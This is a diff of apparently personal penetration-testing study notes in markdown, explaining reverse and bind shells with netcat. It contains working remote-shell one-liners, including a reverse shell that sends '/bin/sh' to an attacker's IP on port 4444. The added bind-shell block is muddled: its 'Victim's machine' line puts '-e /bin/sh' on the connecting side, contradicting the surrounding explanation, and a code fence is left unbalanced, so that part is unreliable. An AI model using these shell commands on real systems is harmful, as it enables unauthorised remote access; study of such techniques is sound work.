@@ -126,13 +126,20 @@ nc -lvp 4444
 ```
 > l for listening, v for verbose, p for port
 ```
-# Victim's machine
+# Target's machine
 nc 192.168.156.1 4444 -e /bin/sh
 ```
 > 192.168.156.1 is attacker's IP address
 > e for execute command
 
 In bind shell, the target sets up a listener on a specific port and the attacker connects to the target. But the execution of `/bin/sh` remains in the target's machine.
+```bash
+# Target's machine
+nc -lvp 4444 -e /bin/sh
+```
+```
+# Victim's machine
+nc 192.168.156.2 4444 -e /bin/sh
 ```
 ## Gaining Access
 ## Maintaining Access
@@ -141,11 +148,11 @@ In bind shell, the target sets up a listener on a specific port and the attacker
 Read:
 Darknet diaries
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNDQ1MDI3NDM3LDE4MTgxNzYyMTksLTEwOT
-c4OTE4MTMsMjA1NDE3MDg1NCwxNTM0NjkyMjU0LC0zNjMxNjIw
-MDksNDkyODkxMzU0LC0xNDk4MjMxMDEsMTg2NTYyMjgxMCwtMj
-A4MTQ2MzIxNCwtMTAxODM2MjY3LC00NzQ5OTA5ODgsLTE0NzMx
-MTUzNiwtMTI0NDE5NzI5OCw3NjI3ODIxNjIsLTE4MzEzMzk4OS
-w0NjIwMjY2NzUsLTExNzY5NTc2OTMsLTEwMDc1MTIyMDgsLTUz
-MzcyNjg1MV19
+eyJoaXN0b3J5IjpbLTEyNDAwNjE1OTcsMTgxODE3NjIxOSwtMT
+A5Nzg5MTgxMywyMDU0MTcwODU0LDE1MzQ2OTIyNTQsLTM2MzE2
+MjAwOSw0OTI4OTEzNTQsLTE0OTgyMzEwMSwxODY1NjIyODEwLC
+0yMDgxNDYzMjE0LC0xMDE4MzYyNjcsLTQ3NDk5MDk4OCwtMTQ3
+MzExNTM2LC0xMjQ0MTk3Mjk4LDc2Mjc4MjE2MiwtMTgzMTMzOT
+g5LDQ2MjAyNjY3NSwtMTE3Njk1NzY5MywtMTAwNzUxMjIwOCwt
+NTMzNzI2ODUxXX0=
 -->
